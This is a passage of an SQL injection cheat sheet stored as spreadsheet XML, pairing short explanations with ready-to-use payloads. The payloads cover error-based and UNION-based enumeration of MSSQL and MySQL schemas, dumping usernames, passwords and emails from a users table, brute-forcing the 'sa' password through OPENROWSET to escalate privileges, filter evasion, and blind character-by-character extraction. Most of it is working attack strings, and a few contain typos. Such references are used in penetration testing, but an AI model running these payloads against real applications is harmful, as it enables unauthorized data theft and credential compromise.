          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or you can use this way (I know, someone will think 2 top should be enough, but sometimes it gives trouble, with 3 top no… don’t ask me why… hey Lame! it’s your query!):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TOP 1 name FROM (SELECT TOP 1 name FROM (SELECT TOP $XX$ name FROM master..sysdatabases ORDER BY name ASC) as foo ORDER by name DESC) as foo ORDER by name DESC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>You can test this syntax with (“or 1 in” on the first query will return always the same result, so we will use “or 1 =”):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 = (SELECT name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)) -- </text:p>
            <text:p>' or 1 in (SELECT TOP 1 name FROM (SELECT TOP 1 name FROM (SELECT TOP $XX$ name FROM master..sysdatabases ORDER BY name ASC) as foo ORDER by name DESC) as foo ORDER by name DESC)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get numeric data we need to convert them to strings and append a non numeric char, otherwise the sql server will do an automatic cast.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select CONVERT(varchar(255),dbid)+'$' from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and we can append data to get results faster</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 = (SELECT CONVERT(varchar(255),dbid)+'$'+name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Ok, now we have to get the tables name, columns etc. We will work on the current database, but you can access to the others with a double dot syntax, like “master..sysdatabases”. This query will return you all the primary keys of all tables names, column names and column type (string, boolean, int).</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IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and this one will return all non primary keys.</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NOT IN (SELECT keyno FROM sysindexkeys WHERE T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>So you can build the database structures using this query:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT  Tablename+'$'+Columnname+'$'+CONVERT(varchar(255),Columntype)</text:p>
            <text:p>FROM ( </text:p>
            <text:p>SELECT T1.name AS Tablename, T2.name AS Columnname, T2.xtype AS Columntype, T2.id AS id </text:p>
            <text:p>FROM sysobjects T1 INNER JOIN syscolumns T2 ON T1.id = T2.id </text:p>
            <text:p>WHERE ( (</text:p>
            <text:p>T1.xtype = 'U' OR T1.xtype = 'V') AND </text:p>
            <text:p>(T2.colid IN ( </text:p>
            <text:p>SELECT keyno </text:p>
            <text:p>FROM sysindexkeys </text:p>
            <text:p>WHERE T1.id = id AND T2.colid = keyno </text:p>
            <text:p>)) </text:p>
            <text:p>)</text:p>
            <text:p>) T4</text:p>
            <text:p>WHERE (( </text:p>
            <text:p>SELECT COUNT(*)</text:p>
            <text:p>FROM (</text:p>
            <text:p>SELECT T7.name AS Tablename, T8.name AS Columnname, T8.xtype AS Columntype, T8.id AS id </text:p>
            <text:p>FROM sysobjects T7 INNER JOIN syscolumns T8 ON T7.id = T8.id WHERE (     </text:p>
            <text:p>(T7.xtype = 'U' OR T7.xtype = 'V') </text:p>
            <text:p>AND (T8.colid IN (      </text:p>
            <text:p>SELECT keyno </text:p>
            <text:p>FROM sysindexkeys </text:p>
            <text:p>WHERE T7.id = id AND T8.colid = keyno </text:p>
            <text:p>)) </text:p>
            <text:p>) </text:p>
            <text:p>) T5 </text:p>
            <text:p>WHERE (CONVERT(varchar(255), T5.id) + T5.columnname &amp;lt;= CONVERT(varchar(255), T4.id) + T4.columnname) </text:p>
            <text:p>) = 3</text:p>
            <text:p>)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or using this (simple) one:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT     CONVERT(varchar(255), T1.name) + '$' + CONVERT(varchar(255), T2.name) + '$' + CONVERT(varchar(255), T2.xtype) AS Expr1</text:p>
            <text:p>FROM         sysobjects T1 INNER JOIN                      syscolumns T2 ON T1.id = T2.id</text:p>
            <text:p>WHERE     (T1.xtype = 'U' OR</text:p>
            <text:p>                      T1.xtype = 'V') AND (T2.colid IN</text:p>
            <text:p>                          (SELECT     keyno</text:p>
            <text:p>                            FROM          sysindexkeys</text:p>
            <text:p>                            WHERE      T1.id = id AND T2.colid = keyno))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Now we can download the primary keys columns ($XX$ is the number of the row) the $ will be the deliminator</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and the other columns</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NOT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Ok… now you have all the database structure of the current database.</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="4">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.3 – Dumping the data</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If you have the database structure, it is simple to get the data. For example if we have a table named “users” with primary key “userid” (numeric) and with columns username,userpass,usermail you can get single data with:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select '$'+convert(varchar(255),username) from users where userid = $XX$) -- </text:p>
            <text:p>' or 1 in (select '$'+convert(varchar(255),userpass) from users where userid = $XX$) -- '</text:p>
            <text:p> or 1 in (select '$'+convert(varchar(255),usermail) from users where userid = $XX$) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or you can get it on a single query with:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select '$'+convert(varchar(255),username)+'$'+convert(varchar(255),userpass)+'$'+convert(varchar(255),usermail)from users where userid = $XX$) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If you wouldn’t use a where condition (if you don’t know how many record there will be, or if you don’t know the primary keys) you can always use the top method as:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in ( SELECT TOP 1 pippo FROM(SELECT TOP 1 pippo FROM ( SELECT TOP $XX$ '$'+convert(varchar(255),username)+'$'+convert(varchar(255),userpass)+'$'+convert(varchar(255),usermail) as pippo from users ORDER BY pippo ASC) as pippo ORDER by pippo DESC) as pippo ORDER by pippo DESC ) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>using UNION SELECT and increase the number of columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1’ UNION SELECT 1,version@@,3,4 –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Another UNION select potential</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UNION ALL (SELECT ‘HELLO!’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Determine number of columns in a table: GROUP/ORDER BY n+1 until you get a False response</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1’ ORDER BY 1--</text:p>
            <text:p>1’ ORDER BY 2--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Error based, determine columns with GROUP/ORDER BY, error will tell you how many columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1’ GROUP BY 1,2,3,4,5--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Error based, determine columns with SELECT … INTO, error will tell you how many columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1’ UNION SELECT 1 INTO @,@,@</text:p>
            <text:p>1’ UNION SELECT 1 INTO @,@</text:p>
            <text:p>1 INTO @,@,@</text:p>
            <text:p>1 INTO @,@</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Error based, determine columns with AND (SELECT * FROM existing_table) = 1, returns columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND (SELECT * FROM users) = 1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Concat 2 columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,concat(table_name,’:’,column_name),3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve columns UNION</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = ‘tablename’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve columns PROCEDURE ANALYSE() (requires web app to display one of the columns)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 PROCEDURE ANALYSE()</text:p>
            <text:p>1 LIMIT 1,1 PROCEDURE ANALYSE()</text:p>
            <text:p>1 LIMIT 2,1 PROCEDURE ANALYSE()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Error based retrieve columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))</text:p>
            <text:p/>
            <text:p>(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);</text:p>
            <text:p/>
            <text:p>AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5</text:p>
            <text:p/>
            <text:p>AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1</text:p>
            <text:p/>
            <text:p>AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)</text:p>
            <text:p/>
            <text:p>AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Find columns from table name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';</text:p>
            <text:p/>
            <text:p>SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve multiple tables/columns at once</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x </text:p>
            <text:p/>
            <text:p>SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>using ORDER BY</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT firstname,lastname,age,groups FROM users ORDER BY firstname</text:p>
            <text:p>SELECT firstname,lastname,age,groups FROM users ORDER BY 3</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of tables</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>show tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1; SHOW TABLES;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>show tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1; SELECT host,user,db from mysql.db</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Table mapping</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT COUNT(*) FROM tablename</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Union retrieve tables. Version = 10 is for MySQL 5</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT GROUP_CONCAT(table)name) FROM information_schema.tables WHERE version=10;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Error based retrieve tables</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))</text:p>
            <text:p/>
            <text:p>(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);</text:p>
            <text:p/>
            <text:p>AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables from Column Name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; </text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T4">SELECT table_name FROM information_schema.columns WHERE column_name = 'username';</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T4">SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Field mapping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM tablename WHERE user LIKE “%root%”</text:p>
            <text:p>SELECT * FROM tablename WHERE user LIKE “%”;</text:p>
            <text:p>SELECT * FROM tablename WHERE user = ‘root’ AND id IS NOT NULL;</text:p>
            <text:p>SELECT * FROM tablename WHERE user = ‘x’ AND id IS NULL;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>User mapping</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM tablename WHERE email = ‘<text:a xlink:href="mailto:user@site.com" xlink:type="simple">user@site.com</text:a>’;</text:p>
            <text:p>SELECT * FROM tablename WHERE user LIKE “%root%”;</text:p>
            <text:p>SELECT * FROM tablehwere WHERE user = ‘username’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Database creds</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>table: mysql.user</text:p>
            <text:p>Columns: user, password</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Database names</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Table: information_schema.schemata, mysql.db</text:p>
            <text:p>Columns: schema_name, db</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.4 – Privilege escalation with OPENROWSET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>A query can be done with normal users privileges, but sometimes you need administrator privileges (for example to use xp_cmdshell) or get access to others databases. On SQL SERVER 2000 you can use the OPENROWSET to bruteforce the admin password (on SQL SERVER 2005 it has been disabled by default) with a query like this one</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If “Login failed for user ‘sa'” appears the login is incorrect, otherwise you found the password. With a query like thisone you can get data of other databases:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =0')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Remember the escape character in MSSQL is ” so, if you need some ‘ on the query in the openrowset you need to use them double like:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =''0''')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p> </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.a Feel around</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>First of all you have to identify a way to get different results with injecting your data, for example:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=1 –</text:p>
            <text:p>1 and 1=2 –</text:p>
            <text:p>1 &amp;&amp; 1;</text:p>
            <text:p>1 || 1;</text:p>
            <text:p>1 XOR 0;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Another interesting way can be use sql optimizations to get an error if the last part of the query is correct.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1 in (select @@version) and 1=1 –</text:p>
            <text:p>1 and 1 in (select @@version) and 1=2 --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>More blind SQL Injection by attempting to create an error using the backslash method seen above:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1\'1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Evading escapes with backslashes (this assumes the application comments out a single quote with another single quote and by introducing a backslash before it, it comments out the singlequote that is added by the filter). This type of filter is applied by mySQL's mysql_real_escape_string() and PERL's DBD method $dbh→quote():</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>\'; DESC users; –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing filter evasion using comment tags:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNI/**/ON SELECT ALL FROM WHERE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Dumping usernames (assuming there is a username table and quotes are not escaped):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>' OR username IS NOT NULL OR username = '</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Finding user supplied tables using the sysObjects table in SQL Server:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Blind check privs</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1′ AND MID((SELECT file_priv FROM mysql.user WHERE user = ‘username’),1,1) = ‘Y</text:p>
            <text:p/>
            <text:p>1′ AND MID((SELECT is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’),1,1)=’Y</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Blind retrieve tables with SUBSTR()</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; ‘A’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.b Brute</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Having this kind of difference between the results gives you a way to work with a blind sql injection. Another way can be using WAIT and similar instructions of the db, but to get the results you will spend a lot of time.</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get the data using this response differences we can use the keyword like:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>If the page will return a non blank result the table sysdatabases columns names contains a record that starts with the letter M. Now you can implement a little brute force tool to get all the names.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'ma%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mas%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'mast%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'maste%')) -- </text:p>
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'master%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
